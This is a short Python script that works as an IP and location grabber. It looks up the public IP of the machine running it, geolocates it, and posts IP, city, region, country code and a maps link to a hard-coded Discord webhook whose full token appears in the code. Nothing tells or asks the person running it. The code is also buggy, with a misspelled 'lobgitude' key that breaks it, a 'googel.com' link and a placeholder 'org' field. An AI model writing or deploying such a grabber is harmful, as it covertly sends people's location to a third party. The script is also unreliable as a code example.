import requests
import ipapi

WEBHOOK_URL = "https://discord.com/api/webhooks/1290226988778262649/0yJEePHeJlySqAsZ2BHR_xPfrk2O11m_jVPKZdw2f9vRLSrqFsEV8zYPtZ9o9_9cUoDT"

def get_loc_info():
    ipserver = requests.get('https://api.ipify.org').text
    soucre = ipapi.location(ip=ipserver)
    return {
        "ip": soucre["ip"],
        "city": soucre["city"],
        "region": soucre["region"],
        "idcountry": soucre["country_code"],
        "callcode": soucre["country_calling_code"],
        "lang": soucre["languages"],
        "org":"org",
        "latitude":str(soucre["latitude"]),
        "longitude":str(soucre["lobgitude"]),
        "googelmap_link":"https://www.googel.com/maps/place/{},{}".format(
        str(soucre["latitude"]),str(soucre["longitude"])
        ),

    }
def send_to_WEBHOOK(WEBHOOK_URL,message):
    data = {"content" : message}
    respons = requests.post(WEBHOOK_URL,json=data)
    if respons.status_code == 204:
        print("ba movafaghiat anjam shod")
    else:
        print("EROOR")
        print(respons.status_code)
if __name__ == "__main__":
    location_info = get_loc_info()
    message = (
        f"IP Address: {location_info['ip']}\n"
        f"City: {location_info['city']}\n"
        f"Region: {location_info['region']}\n"
        f"Country Code: {location_info['idcountry']}\n"
        f"Country Call Code: {location_info['callcode']}\n"
        f"Googel Maps: {location_info['googelmap_link']}\n"
    )
    send_to_WEBHOOK(WEBHOOK_URL,message)